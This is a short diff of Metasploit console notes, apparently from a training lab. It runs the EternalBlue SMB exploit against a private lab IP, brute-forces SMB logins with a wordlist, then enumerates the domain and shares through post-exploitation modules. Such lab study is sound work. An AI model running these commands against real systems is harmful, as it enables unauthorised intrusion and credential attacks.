@@ -2,10 +2,6 @@
 
 use exploit/windows/smb/ms17_010_eternalblue
 
-# check
-
-show payloads
-
 # set
 
 setg rhosts 10.10.148.128
@@ -31,4 +27,22 @@ show options
 set rport 445
 setg SMBUser testuser
 setg PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
+run
+
+# enum domain name
+
+Use post/windows/gather/enum_domain
+show options
+session -i
+
+session -i 1
+run
+
+# search enum
+
+search enu_share
+use 0
+show options
+sessions -l
+set session 2
 run
